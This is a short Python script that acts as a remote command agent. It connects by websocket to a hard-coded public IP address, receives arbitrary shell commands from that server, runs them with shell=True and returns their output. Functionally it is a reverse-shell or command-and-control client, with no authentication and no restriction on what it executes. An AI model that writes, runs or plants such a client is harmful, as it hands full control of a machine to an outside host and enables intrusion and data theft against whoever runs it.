import asyncio
import websockets
import subprocess

async def run_agent():
    uri = "ws://13.58.212.239:8765/ws"  # Replace with your server's IP if needed
    async with websockets.connect(uri) as websocket:
        print("Connected to server.")
        # Wait for command from server
        command = await websocket.recv()
        print(f"Received command from server: {command}")
        # Run the command locally
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
        except Exception as e:
            output = f"Error running command: {e}"
        # Send output back to server
        await websocket.send(output)

if __name__ == "__main__":
    asyncio.run(run_agent())
